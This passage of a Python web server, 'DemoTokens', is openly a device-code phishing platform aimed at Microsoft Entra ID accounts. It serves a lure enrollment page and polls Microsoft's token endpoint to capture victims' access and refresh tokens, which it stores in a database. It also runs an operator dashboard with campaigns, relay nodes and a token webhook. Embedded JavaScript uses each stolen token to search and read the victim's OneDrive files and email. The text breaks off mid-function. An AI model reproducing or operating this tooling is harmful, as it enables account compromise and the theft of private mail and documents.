#!/usr/bin/env python3
"""
DemoTokens — unified server (GraphSpy-inspired architecture)

One server, one port, SQLite persistence.

Victim routes  (phishing-facing)
---------------------------------
  GET  /               Device-code enrollment page (Dunder Mifflin theme)
  POST /poll           Poll MS token endpoint; store token in DB on success
  GET  /search?s=<id>  Victim search page (post-auth redirect)

Operator routes  (dark sidebar UI)
------------------------------------
  GET  /app                   Dashboard — stats + recent captures
  GET  /app/device-codes       All campaigns; background-polled per campaign
  POST /app/device-codes/new   Operator creates a new campaign
  GET  /app/tokens             All captured tokens
  GET  /app/search?id=<id>     OneDrive + email search for a specific token
  GET  /app/nodes              Registered relay nodes
  POST /app/nodes/delete       Delete a relay node record
  POST /relay/checkin          Relay node check-in (validates RELAY_SECRET, returns node_id)
  POST /webhook                Ingest token from an authenticated relay node

Environment variables
---------------------
  PORT     Listening port (default 3000)
  LOG_DIR  Per-request log directory (default /logs)
  DB_PATH  SQLite path — set in db.py (default /data/demotokens.db)

Run
---
  python main_server.py
"""

import hmac
import io
import json
import os
import datetime
import threading
import time
import urllib.request
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

import db
import nginx_helper
from html_enroll import build_enroll_html, build_landing_html
from html_search  import build_search_html

PORT         = int(os.environ.get("PORT",     3000))
PORT_MAX     = int(os.environ.get("PORT_MAX", 3010))
LOG_DIR      = os.environ.get("LOG_DIR", "/logs")
RELAY_SECRET = os.environ.get("RELAY_SECRET", "")

CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
RESOURCE  = "https://graph.microsoft.com"
SCOPES    = "openid profile email offline_access Mail.Read Files.Read"
DC_URL    = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
TOKEN_URL = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"

_log_lock = threading.Lock()

# ---------------------------------------------------------------------------
# MS HTTP helper
# ---------------------------------------------------------------------------

def ms_post(url, params):
    data = urllib.parse.urlencode(params).encode("utf-8")
    req  = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode("utf-8"))


# ---------------------------------------------------------------------------
# Background device-code poller
# ---------------------------------------------------------------------------

class DeviceCodePoller:
    """Polls MS token endpoint in background threads for operator campaigns."""

    def __init__(self):
        self._lock   = threading.Lock()
        self._active = {}

    def start(self, dc_id, device_code, interval, expires_in):
        t = threading.Thread(
            target=self._run,
            args=(dc_id, device_code, int(interval), int(expires_in)),
            daemon=True,
            name="poller-" + dc_id[:8],
        )
        with self._lock:
            self._active[dc_id] = t
        t.start()
        print("[POLLER] Started  dc=%s" % dc_id[:8])

    def _run(self, dc_id, device_code, interval, expires_in):
        deadline = time.monotonic() + expires_in
        while time.monotonic() < deadline:
            time.sleep(interval)
            status, data = ms_post(TOKEN_URL, {
                "client_id":  CLIENT_ID,
                "resource":   RESOURCE,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "code":       device_code,
            })
            if status == 200 and data.get("token_type"):
                rec = db.store_token(data, source="device_code")
                db.update_device_code_status(dc_id, "captured", rec["id"])
                print("[POLLER] Captured  dc=%s  user=%s" % (dc_id[:8], rec["upn"]))
                break
            err = data.get("error", "")
            if err == "slow_down":
                interval = min(interval + 5, 30)
            elif err not in ("authorization_pending",):
                db.update_device_code_status(dc_id, "expired")
                break
        else:
            db.update_device_code_status(dc_id, "expired")
            print("[POLLER] Expired   dc=%s" % dc_id[:8])
        with self._lock:
            self._active.pop(dc_id, None)


_poller = DeviceCodePoller()

# ---------------------------------------------------------------------------
# Operator UI — CSS + layout builder
# ---------------------------------------------------------------------------

_OP_CSS = """
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg:       #0d1117;
  --surface:  #161b22;
  --surface2: #21262d;
  --border:   #30363d;
  --accent:   #58a6ff;
  --text:     #e6edf3;
  --muted:    #7d8590;
  --green:    #3fb950;
  --yellow:   #d29922;
  --red:      #f85149;
  --purple:   #a371f7;
  --sidebar-w: 220px;
}
html, body { height: 100%; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: var(--bg); color: var(--text);
       display: flex; flex-direction: column; min-height: 100vh; }
.navbar { background: var(--surface); border-bottom: 1px solid var(--border);
          height: 52px; padding: 0 20px; display: flex; align-items: center;
          gap: 12px; flex-shrink: 0; position: sticky; top: 0; z-index: 50; }
.brand     { font-weight: 700; font-size: 15px; color: var(--accent);
             letter-spacing: 0.04em; text-decoration: none; }
.brand-sub { font-size: 11px; color: var(--muted); margin-left: 4px; }
.navbar-right { margin-left: auto; font-size: 11px; color: var(--muted); }
.layout  { display: flex; flex: 1; overflow: hidden; }
.sidebar { width: var(--sidebar-w); background: var(--surface);
           border-right: 1px solid var(--border); padding: 12px 0;
           flex-shrink: 0; overflow-y: auto; }
.nav-sect { padding: 10px 16px 4px; font-size: 10px; letter-spacing: 0.12em;
            text-transform: uppercase; color: var(--muted); }
.nav-link { display: flex; align-items: center; gap: 10px; padding: 8px 16px;
            font-size: 13px; color: var(--text); text-decoration: none;
            transition: background 0.1s; }
.nav-link:hover { background: var(--surface2); }
.nav-link.active { background: rgba(88,166,255,0.12); color: var(--accent);
                   border-left: 3px solid var(--accent); padding-left: 13px; }
.nav-icon { width: 18px; text-align: center; flex-shrink: 0; }
.main { flex: 1; overflow-y: auto; padding: 28px 32px; }
h2 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
.page-sub { font-size: 12px; color: var(--muted); margin-bottom: 20px; }
.breadcrumb { font-size: 12px; color: var(--muted); margin-bottom: 6px; }
.breadcrumb a { color: var(--accent); text-decoration: none; }
.breadcrumb a:hover { text-decoration: underline; }
.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
         gap: 12px; margin-bottom: 24px; }
.stat  { background: var(--surface); border: 1px solid var(--border);
         border-radius: 6px; padding: 16px; }
.stat-val { font-size: 30px; font-weight: 700; color: var(--accent); line-height: 1; }
.stat-lbl { font-size: 11px; color: var(--muted); margin-top: 6px; }
.card { background: var(--surface); border: 1px solid var(--border);
        border-radius: 6px; overflow: hidden; margin-bottom: 20px; }
.card-hdr { padding: 12px 16px; border-bottom: 1px solid var(--border);
            font-size: 12px; font-weight: 600;
            display: flex; align-items: center; justify-content: space-between; }
.card-body { padding: 16px; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
thead th { padding: 8px 12px; text-align: left; font-size: 10px; letter-spacing: 0.10em;
           text-transform: uppercase; color: var(--muted);
           border-bottom: 1px solid var(--border); font-weight: 600; }
tbody tr { border-bottom: 1px solid var(--border); transition: background 0.1s; }
tbody tr:last-child { border-bottom: none; }
tbody tr:hover { background: var(--surface2); }
td { padding: 10px 12px; vertical-align: middle; }
.badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px;
         border-radius: 10px; font-size: 10px; font-weight: 600;
         letter-spacing: 0.06em; text-transform: uppercase; }
.badge-pending     { background: rgba(210,153,34,0.15); color: var(--yellow); border: 1px solid rgba(210,153,34,0.4); }
.badge-captured    { background: rgba(63,185,80,0.15);  color: var(--green);  border: 1px solid rgba(63,185,80,0.4); }
.badge-expired     { background: rgba(248,81,73,0.15);  color: var(--red);    border: 1px solid rgba(248,81,73,0.4); }
.badge-poll        { background: rgba(88,166,255,0.15); color: var(--accent); border: 1px solid rgba(88,166,255,0.4); }
.badge-device_code { background: rgba(63,185,80,0.15);  color: var(--green);  border: 1px solid rgba(63,185,80,0.4); }
.badge-webhook     { background: rgba(163,113,247,0.15);color: var(--purple); border: 1px solid rgba(163,113,247,0.4); }
.badge-created     { background: rgba(125,133,144,0.12);color: var(--muted);  border: 1px solid rgba(125,133,144,0.3); }
.btn { display: inline-flex; align-items: center; gap: 5px; padding: 5px 12px;
       border-radius: 4px; font-size: 11px; font-weight: 600; letter-spacing: 0.04em;
       text-decoration: none; cursor: pointer; border: 1px solid var(--border);
       background: var(--surface2); color: var(--text);
       transition: border-color 0.15s, color 0.15s; font-family: inherit; }
.btn:hover { border-color: var(--accent); color: var(--accent); }
.btn-primary { background: var(--accent); border-color: var(--accent); color: #0d1117; }
.btn-primary:hover { background: #79c0ff; border-color: #79c0ff; color: #0d1117; }
.btn-sm { padding: 3px 9px; font-size: 10px; }
.search-row   { display: flex; gap: 8px; width: 100%; margin-bottom: 8px; }
.search-input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
                border-radius: 4px; padding: 8px 12px; font-size: 13px;
                color: var(--text); outline: none; font-family: inherit; }
.search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(88,166,255,0.15); }
.search-btn { background: var(--accent); color: #0d1117; border: 1px solid var(--accent);
              border-radius: 4px; padding: 8px 14px; font-size: 11px; font-weight: 600;
              letter-spacing: 0.05em; text-transform: uppercase; cursor: pointer;
              white-space: nowrap; font-family: inherit; transition: background 0.15s; }
.search-btn:hover { background: #79c0ff; }
.search-btn.email-btn { background: #7c4dff; border-color: #7c4dff; color: #fff; }
.search-btn.email-btn:hover { background: #9c6fff; }
.results-panel { border: 1px solid var(--border); border-radius: 4px;
                 overflow: hidden; margin-top: 12px; }
.results-hdr   { padding: 7px 12px; background: var(--surface2);
                 border-bottom: 1px solid var(--border);
                 font-size: 10px; letter-spacing: 0.12em;
                 text-transform: uppercase; color: var(--muted); }
.data-row { display: flex; align-items: center; gap: 8px; padding: 9px 12px;
            border-bottom: 1px solid var(--border); font-size: 12px;
            cursor: pointer; transition: background 0.1s; }
.data-row:last-child { border-bottom: none; }
.data-row:hover { background: var(--surface2); }
.data-row-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.data-meta     { font-size: 11px; color: var(--muted); white-space: nowrap;
                 max-width: 220px; overflow: hidden; text-overflow: ellipsis; }
.data-unread   { color: var(--accent); flex-shrink: 0; }
.data-loading  { padding: 16px; text-align: center; color: var(--muted); font-size: 12px; }
.upn  { color: var(--accent); font-weight: 500; }
.mono { font-family: 'Courier New', monospace; font-size: 11px; }
.empty { padding: 40px; text-align: center; color: var(--muted); font-size: 13px; }
.info-bar { background: var(--surface2); border: 1px solid var(--border);
            border-radius: 4px; padding: 10px 14px; font-size: 12px;
            margin-bottom: 16px; display: flex; align-items: center;
            gap: 20px; flex-wrap: wrap; }
.viewer-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.75);
                  z-index: 100; align-items: center; justify-content: center; padding: 20px; }
.viewer-overlay.visible { display: flex; animation: fadeIn 0.2s ease; }
.viewer-card  { background: var(--surface); border: 1px solid var(--border); border-radius: 6px;
                max-width: 800px; width: 100%; max-height: 85vh;
                display: flex; flex-direction: column;
                box-shadow: 0 16px 64px rgba(0,0,0,0.6); }
.viewer-hdr   { background: var(--surface2); padding: 12px 16px;
                display: flex; align-items: center; gap: 10px;
                border-bottom: 1px solid var(--border); flex-shrink: 0; }
.viewer-title { flex: 1; font-size: 13px; font-weight: 600; overflow: hidden;
                text-overflow: ellipsis; white-space: nowrap; }
.viewer-close { background: transparent; border: 1px solid var(--border); color: var(--muted);
                border-radius: 4px; width: 28px; height: 28px; cursor: pointer;
                font-size: 18px; line-height: 1; transition: color 0.15s; }
.viewer-close:hover { color: var(--text); border-color: var(--text); }
.viewer-body  { overflow-y: auto; padding: 16px; flex: 1;
                font-family: 'Courier New', monospace; font-size: 12px;
                line-height: 1.7; white-space: pre-wrap; background: var(--bg); }
.viewer-body.html-body { white-space: normal; font-family: inherit; background: #fff; color: #000; }
.viewer-meta  { background: var(--surface2); border-top: 1px solid var(--border);
                padding: 8px 16px; font-size: 11px; color: var(--muted); flex-shrink: 0; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(6px); }
                    to   { opacity: 1; transform: translateY(0); } }
.fade-in { animation: fadeIn 0.25s ease both; }
"""


def _esc(s):
    return (
        str(s)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def _op_page(title, active, content, extra_js=""):
    nav_items = [
        ("/app",              "&#9632;",  "Dashboard",    "dashboard"),
        ("/app/device-codes", "&#8593;",  "Device Codes", "device-codes"),
        ("/app/tokens",       "&#128273;","Tokens",       "tokens"),
        ("/app/nodes",        "&#128225;","Relay Nodes",  "nodes"),
    ]
    nav_html = ""
    for href, icon, label, key in nav_items:
        cls = "nav-link active" if active == key else "nav-link"
        nav_html += (
            '<a href="' + href + '" class="' + cls + '">'
            '<span class="nav-icon">' + icon + "</span>" + label + "</a>\n"
        )
    js_block = "<script>\n" + extra_js + "\n</script>" if extra_js else ""
    return (
        "<!DOCTYPE html>"
        '<html lang="en"><head>'
        '<meta charset="UTF-8"/>'
        '<meta name="viewport" content="width=device-width,initial-scale=1"/>'
        "<title>" + _esc(title) + "</title>"
        "<style>" + _OP_CSS + "</style>"
        "</head><body>"
        "<div class='navbar'>"
        "<a class='brand' href='/app'>&#9760; DemoTokens</a>"
        "<span class='brand-sub'>Device Code Phishing Platform</span>"
        "<span class='navbar-right'>MS Graph &bull; Entra ID</span>"
        "</div>"
        "<div class='layout'>"
        "<nav class='sidebar'>"
        "<div class='nav-sect'>Navigate</div>"
        + nav_html
        + "</nav>"
        "<main class='main fade-in'>"
        + content
        + "</main></div>"
        + js_block
        + "</body></html>"
    )


# ---------------------------------------------------------------------------
# Operator page builders
# ---------------------------------------------------------------------------

def _dashboard_html():
    c = db.counts()
    stats = (
        "<div class='stats'>"
        "<div class='stat'><div class='stat-val'>" + str(c["tokens"]) + "</div>"
        "<div class='stat-lbl'>Tokens Captured</div></div>"
        "<div class='stat'><div class='stat-val'>" + str(c["pending"]) + "</div>"
        "<div class='stat-lbl'>Active Campaigns</div></div>"
        "<div class='stat'><div class='stat-val'>" + str(c["captured_campaigns"]) + "</div>"
        "<div class='stat-lbl'>Campaigns Captured</div></div>"
        "</div>"
    )
    recent = db.list_tokens(limit=10)
    if recent:
        rows = "".join(
            "<tr>"
            "<td class='upn'>" + _esc(t["upn"]) + "</td>"
            "<td>" + _esc(t["captured_at"]) + "</td>"
            "<td><span class='badge badge-" + _esc(t["source"]) + "'>"
            + _esc(t["source"]) + "</span></td>"
            "<td><a class='btn btn-sm' href='/app/search?id="
            + _esc(t["id"]) + "'>Search</a></td>"
            "</tr>"
            for t in recent
        )
        table = (
            "<table><thead><tr>"
            "<th>User (UPN)</th><th>Captured At</th><th>Source</th><th>Action</th>"
            "</tr></thead><tbody>" + rows + "</tbody></table>"
        )
    else:
        table = "<div class='empty'>No tokens yet. Start a campaign or wait for a victim.</div>"

    content = (
        "<h2>Dashboard</h2>"
        "<p class='page-sub'>Overview of captured tokens and active campaigns.</p>"
        + stats
        + "<div class='card'>"
        "<div class='card-hdr'><span>Recent Captures</span>"
        "<a class='btn btn-sm' href='/app/tokens'>View All</a></div>"
        + table
        + "</div>"
    )
    return _op_page("Dashboard", "dashboard", content)


def _device_codes_html(hostname=""):
    campaigns = db.list_device_codes()

    def _landing(dc):
        p      = int(dc.get("port") or PORT)
        domain = (dc.get("domain") or "").strip()
        if domain:
            href  = "http://" + domain + "/c/" + dc["id"]
            label = domain
        elif hostname:
            href  = "http://" + hostname + ":" + str(p) + "/c/" + dc["id"]
            label = "Landing" + (" :" + str(p) if p != PORT else "")
        else:
            href  = "/c/" + dc["id"]
            label = "Landing" + (" :" + str(p) if p != PORT else "")
        return (
            "<a class='btn btn-sm' href='" + _esc(href) + "' target='_blank'>"
            + _esc(label) + "</a>"
        )

    if campaigns:
        rows = "".join(
            "<tr>"
            "<td class='mono' style='user-select:all'>"
            + (_esc(dc["user_code"]) if dc["user_code"] else "\u2014")
            + "</td>"
            "<td><span class='badge badge-" + _esc(dc["status"]) + "'>"
            + _esc(dc["status"]) + "</span></td>"
            "<td>" + _esc(dc["created_at"]) + "</td>"
            "<td class='upn'>" + _esc(dc.get("victim_upn") or "\u2014") + "</td>"
            "<td>" + _landing(dc) + "</td>"
            "<td>"
            + (
                "<a class='btn btn-sm' href='/app/search?id="
                + _esc(dc["token_id"]) + "'>Search</a> "
                if dc.get("token_id") else ""
            )
            + "<button class='btn btn-sm' style='color:var(--red);border-color:var(--red)' "
            + "onclick=\"delCampaign('" + _esc(dc["id"]) + "')\">Delete</button></td>"
            "</tr>"
            for dc in campaigns
        )
        table = (
            "<table><thead><tr>"
            "<th>User Code</th><th>Status</th><th>Created</th>"
            "<th>Victim UPN</th><th>Landing URL</th><th>Action</th>"
            "</tr></thead><tbody>" + rows + "</tbody></table>"
        )
    else:
        table = "<div class='empty'>No campaigns. Click \u201cNew Campaign\u201d to start one.</div>"

    del_all_js = (
        "function delCampaign(id){if(!confirm('Delete this campaign?'))return;"
        "fetch('/app/device-codes/delete',{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({id:id})}).then(function(){location.reload();});}"
        "function clearCampaigns(){if(!confirm('Delete ALL campaigns? This cannot be undone.'))return;"
        "fetch('/app/device-codes/clear',{method:'POST'}).then(function(){location.reload();});}"
    )

    content = (
        "<h2>Device Code Campaigns</h2>"
        "<p class='page-sub'>The device code is fetched from Microsoft only when the victim clicks the landing page button.</p>"
        "<div class='card'>"
        "<div class='card-hdr'><span>Campaigns</span>"
        "<div style='display:flex;gap:6px'>"
        "<form method='POST' action='/app/device-codes/new'"
        " style='margin:0;display:flex;gap:6px;align-items:center'>"
        "<input type='number' name='port' value='" + str(PORT) + "'"
        " min='" + str(PORT) + "' max='" + str(PORT_MAX) + "'"
        " title='Listening port for this campaign (" + str(PORT) + "\u2013" + str(PORT_MAX) + ")'"
        " style='width:80px;background:var(--surface2);border:1px solid var(--border);"
        "border-radius:4px;padding:3px 8px;font-size:11px;color:var(--text);font-family:inherit' />"
        "<input type='text' name='domain' placeholder='campaign1.example.com (optional)'"
        " title='Custom domain for this campaign — used in the landing URL instead of hostname:port'"
        " style='width:220px;background:var(--surface2);border:1px solid var(--border);"
        "border-radius:4px;padding:3px 8px;font-size:11px;color:var(--text);font-family:inherit' />"
        "<button class='btn btn-primary btn-sm' type='submit'>+ New Campaign</button>"
        "</form>"
        "<button class='btn btn-sm' style='color:var(--red);border-color:var(--red)' onclick='clearCampaigns()'>Clear All</button>"
        "</div></div>"
        + table
        + "</div>"
        "<div class='card'><div class='card-hdr'>Campaign URLs</div>"
        "<div class='card-body' style='font-size:12px;color:var(--muted);line-height:1.8'>"
        "Each campaign has a unique victim URL "
        "<code style='color:var(--accent)'>/c/&lt;id&gt;</code>. "
        "Share the <b>Landing</b> link from the table above. "
        "The device code is only requested from Microsoft when the victim clicks "
        "<em>Begin Device Enrollment</em>."
        "</div></div>"
    )

    # Build nginx config block for any campaign that has a domain
    domain_campaigns = [dc for dc in campaigns if (dc.get("domain") or "").strip()]
    if domain_campaigns:
        nginx_lines = ["# nginx reverse-proxy config — generated by DemoTokens", ""]
        for dc in domain_campaigns:
            d = dc["domain"].strip()
            p = int(dc.get("port") or PORT)
            nginx_lines += [
                "server {",
                "    listen 80;",
                "    server_name " + d + ";",
                "    location / {",
                "        proxy_pass         http://127.0.0.1:" + str(p) + ";",
                "        proxy_set_header   Host              $host;",
                "        proxy_set_header   X-Real-IP         $remote_addr;",
                "        proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;",
                "    }",
                "}",
                "",
            ]
        nginx_text = "\n".join(nginx_lines)
        content += (
            "<div class='card'><div class='card-hdr'>Nginx Reverse-Proxy Config"
            "<button class='btn btn-sm' onclick=\"navigator.clipboard.writeText("
            "document.getElementById('nginxCfg').textContent)"
            ".then(function(){this.textContent='Copied!'}.bind(this))\">Copy</button></div>"
            "<div class='card-body'>"
            "<pre id='nginxCfg' style='background:var(--bg);border:1px solid var(--border);"
            "border-radius:4px;padding:14px;font-size:11px;line-height:1.6;"
            "overflow-x:auto;white-space:pre;color:var(--text);margin:0'>"
            + _esc(nginx_text)
            + "</pre></div></div>"
        )

    return _op_page("Device Codes", "device-codes", content, extra_js=del_all_js)


def _tokens_html():
    tokens = db.list_tokens()
    if tokens:
        rows = "".join(
            "<tr>"
            "<td class='upn'>" + _esc(t["upn"]) + "</td>"
            "<td>" + _esc(t["captured_at"]) + "</td>"
            "<td><span class='badge badge-" + _esc(t["source"]) + "'>"
            + _esc(t["source"]) + "</span></td>"
            "<td class='mono' style='color:var(--muted);max-width:220px;"
            "overflow:hidden;text-overflow:ellipsis;white-space:nowrap'>"
            + _esc((t.get("scope") or "")[:70]) + "</td>"
            "<td><a class='btn btn-sm' href='/app/search?id="
            + _esc(t["id"]) + "'>Search</a> "
            + "<button class='btn btn-sm' style='color:var(--red);border-color:var(--red)' "
            + "onclick=\"delToken('" + _esc(t["id"]) + "')\">Delete</button></td>"
            "</tr>"
            for t in tokens
        )
        table = (
            "<table><thead><tr>"
            "<th>User (UPN)</th><th>Captured At</th><th>Source</th>"
            "<th>Scope</th><th>Action</th>"
            "</tr></thead><tbody>" + rows + "</tbody></table>"
        )
    else:
        table = "<div class='empty'>No tokens captured yet.</div>"

    del_all_js = (
        "function delToken(id){if(!confirm('Delete this token?'))return;"
        "fetch('/app/tokens/delete',{method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({id:id})}).then(function(){location.reload();});}"
        "function clearTokens(){if(!confirm('Delete ALL tokens? This cannot be undone.'))return;"
        "fetch('/app/tokens/clear',{method:'POST'}).then(function(){location.reload();});}"
    )

    content = (
        "<h2>Captured Tokens</h2>"
        "<p class='page-sub'>All access tokens captured via device-code phishing or webhook.</p>"
        "<div class='card'>"
        "<div class='card-hdr'><span>Tokens</span>"
        "<button class='btn btn-sm' style='color:var(--red);border-color:var(--red)' onclick='clearTokens()'>Clear All</button>"
        "</div>"
        + table + "</div>"
    )
    return _op_page("Tokens", "tokens", content, extra_js=del_all_js)


def _nodes_html():
    nodes = db.list_nodes()
    if nodes:
        rows = "".join(
            "<tr>"
            "<td class='mono' style='color:var(--muted);max-width:160px;"
            "overflow:hidden;text-overflow:ellipsis;white-space:nowrap'>"
            + _esc(n["id"][:16]) + "&hellip;</td>"
            "<td>" + _esc(n.get("label") or "&mdash;") + "</td>"
            "<td class='mono'>" + _esc(n.get("ip") or "&mdash;") + "</td>"
            "<td>" + _esc(n.get("registered_at", "")) + "</td>"
            "<td>" + _esc(n.get("last_seen", "")) + "</td>"
            "<td><button class='btn btn-sm' style='color:var(--red);border-color:var(--red)' "
            "onclick=\"delNode('" + _esc(n["id"]) + "')\">Delete</button></td>"
            "</tr>"
            for n in nodes
        )
        table = (
            "<table><thead><tr>"
            "<th>Node ID (prefix)</th><th>Label</th><th>IP</th>"
            "<th>Registered</th><th>Last Seen</th><th>Action</th>"
            "</tr></thead><tbody>" + rows + "</tbody></table>"
        )
    else:
        table = "<div class='empty'>No relay nodes have checked in yet.</div>"

    del_js = (
        "function delNode(id){if(!confirm('Remove this relay node?'))return;"
        "fetch('/app/nodes/delete',{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({id:id})}).then(function(){location.reload();});}"
    )

    content = (
        "<h2>Relay Nodes</h2>"
        "<p class='page-sub'>Remote PHP relay nodes that have checked in with this panel.</p>"
        "<div class='card'>"
        "<div class='card-hdr'><span>Registered Nodes</span></div>"
        + table
        + "</div>"
        "<div class='card'><div class='card-hdr'>Check-in Protocol</div>"
        "<div class='card-body' style='font-size:12px;color:var(--muted);line-height:1.9'>"
        "Each relay node must <code style='color:var(--accent)'>POST /relay/checkin</code> "
        "with the <code style='color:var(--accent)'>X-Relay-Secret</code> header before it "
        "can submit tokens. The server returns a <b>node_id</b> that must accompany every "
        "<code style='color:var(--accent)'>POST /webhook</code> as the "
        "<code style='color:var(--accent)'>X-Node-Id</code> header."
        "</div></div>"
    )
    return _op_page("Relay Nodes", "nodes", content, extra_js=del_js)


def _search_page_html(token_id):
    token = db.get_token(token_id)
    if not token:
        return None

    access_token_js = json.dumps(token["access_token"])

    js = "\n".join([
        "(function() {",
        "var ACCESS_TOKEN = " + access_token_js + ";",
        "var _searchItems = [];",
        "var _emailItems  = [];",
        "function escHtml(s) {",
        "  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');",
        "}",
        "function formatBytes(b) {",
        "  if (b==null) return '';",
        "  if (b<1024) return b+' B';",
        "  if (b<1048576) return (b/1024).toFixed(1)+' KB';",
        "  return (b/1048576).toFixed(1)+' MB';",
        "}",
        "function runSearch(scope) {",
        "  var kw = document.getElementById('searchInput').value.trim();",
        "  if (!kw) return;",
        "  document.getElementById('searchResultsPanel').style.display='';",
        "  scope === 'onedrive' ? searchOneDrive(kw) : searchEmails(kw);",
        "}",
        "function searchOneDrive(kw) {",
        "  var panel = document.getElementById('searchResults');",
        "  panel.innerHTML = '<div class=\"data-loading\">Searching OneDrive\u2026</div>';",
        "  fetch('https://graph.microsoft.com/v1.0/me/drive/root/search(q=%27'",
        "    +encodeURIComponent(kw)+'%27)?$top=25&$select=id,name,size,lastModifiedDateTime,folder,file',",
        "    {headers:{'Authorization':'Bearer '+ACCESS_TOKEN}})",
        "  .then(r=>r.ok?r.json():Promise.reject('Graph '+r.status))",
        "  .then(data=>{",
        "    _searchItems=data.value||[];",
        "    if(!_searchItems.length){panel.innerHTML='<div class=\"data-loading\">No files found.</div>';return;}",
        "    panel.innerHTML='<div class=\"results-hdr\">&#128193; OneDrive \u2014 '+_searchItems.length+' result(s)</div>'",
        "      +_searchItems.map((item,i)=>{",
        "        var icon=item.folder?'&#128193;':'&#128196;';",
        "        var size=item.size!=null?formatBytes(item.size):'';",
        "        var mod=item.lastModifiedDateTime?new Date(item.lastModifiedDateTime).toLocaleDateString():'';",
        "        var meta=[size,mod].filter(Boolean).join(' \u00b7 ');",
        "        return '<div class=\"data-row\" onclick=\"openItem('+i+')\">'+icon",
        "          +' <span class=\"data-row-name\">'+escHtml(item.name)+'</span>'",
        "          +(meta?'<span class=\"data-meta\">'+escHtml(meta)+'</span>':'')+'</div>';",
        "      }).join('');",
        "  })",
        "  .catch(e=>{panel.innerHTML='<div class=\"data-loading\">Error: '+escHtml(String(e))+'</div>';});",
        "}",
        "function searchEmails(kw) {",
        "  var panel = document.getElementById('searchResults');",
        "  panel.innerHTML = '<div class=\"data-loading\">Searching emails\u2026</div>';",
        "  fetch('https://graph.microsoft.com/v1.0/me/messages?$search=%22'+encodeURIComponent(kw)",
        "    +'%22&$top=15&$select=id,subject,from,receivedDateTime,isRead',",
        "    {headers:{'Authorization':'Bearer '+ACCESS_TOKEN}})",
        "  .then(r=>r.ok?r.json():Promise.reject('Graph '+r.status))",
        "  .then(data=>{",
        "    _emailItems=data.value||[];",
        "    if(!_emailItems.length){panel.innerHTML='<div class=\"data-loading\">No emails found.</div>';return;}",
        "    panel.innerHTML='<div class=\"results-hdr\">&#9993; Email \u2014 '+_emailItems.length+' result(s)</div>'",
        "      +_emailItems.map((msg,i)=>{",
        "        var from=msg.from&&msg.from.emailAddress",
        "          ?(msg.from.emailAddress.name||msg.from.emailAddress.address||'(unknown)'):'(unknown)';",
        "        var date=msg.receivedDateTime?new Date(msg.receivedDateTime).toLocaleDateString():'';",
        "        var unread=!msg.isRead?'<span class=\"data-unread\">\u25cf</span>':'';",
        "        return '<div class=\"data-row\" onclick=\"openEmail('+i+')\">'+unread",
        "          +'<span class=\"data-row-name\">'+escHtml(msg.subject||'(no subject)')+'</span>'",
        "          +'<span class=\"data-meta\">'+escHtml(from)+' \u00b7 '+date+'</span></div>';",
        "      }).join('');",
        "  })",
        "  .catch(e=>{panel.innerHTML='<div class=\"data-loading\">Error: '+escHtml(String(e))+'</div>';});",
        "}",
        "function openItem(i) {",
        "  var item=_searchItems[i]; if(!item) return;",
        "  if(item.folder){showViewer(item.name,'');document.getElementById('viewerBody').textContent='(Folder)';return;}",
        "  var ext=(item.name||'').split('.').pop().toLowerCase();",
        "  var textExts=['txt','csv','md','json','xml','yaml','yml','log','py','js','ts','html','htm',",
        "    'css','sh','bat','ps1','ini','cfg','conf','toml','rs','go','java','c','cpp','h','rb','php','sql'];",
        "  showViewer(item.name,'');",
        "  fetch('https://graph.microsoft.com/v1.0/me/drive/items/'+encodeURIComponent(item.id),",
        "    {headers:{'Authorization':'Bearer '+ACCESS_TOKEN}})",
        "  .then(r=>r.ok?r.json():Promise.reject('Graph '+r.status))",
        "  .then(d=>{",
        "    document.getElementById('viewerMeta').textContent='Size: '+formatBytes(d.size||0);",
        "    var dlUrl=d['@microsoft.graph.downloadUrl'];",
        "    if(!dlUrl){document.getElementById('viewerBody').textContent='(No download URL)';return null;}",
        "    if(textExts.indexOf(ext)===-1){document.getElementById('viewerBody').textContent='(Binary)\\nSize: '+formatBytes(d.size);return null;}",
        "    return fetch(dlUrl);",
        "  })",
        "  .then(r=>r?r.text():null)",
        "  .then(t=>{if(t==null)return;",
        "    document.getElementById('viewerBody').textContent=t.length>100000?t.slice(0,100000)+'\\n\u2026[truncated]':t;})",
        "  .catch(e=>{document.getElementById('viewerBody').textContent='Error: '+e.message;});",
        "}",
        "function openEmail(i) {",
        "  var msg=_emailItems[i]; if(!msg) return;",
        "  showViewer(msg.subject||'(no subject)','');",
        "  fetch('https://graph.microsoft.com/v1.0/me/messages/'+encodeURIComponent(msg.id)",
        "    +'?$select=subject,body,from,receivedDateTime',",
        "    {headers:{'Authorization':'Bearer '+ACCESS_TOKEN}})",
        "  .then(r=>r.ok?r.json():Promise.reject('Graph '+r.status))",
        "  .then(data=>{",
        "    var from=data.from&&data.from.emailAddress",
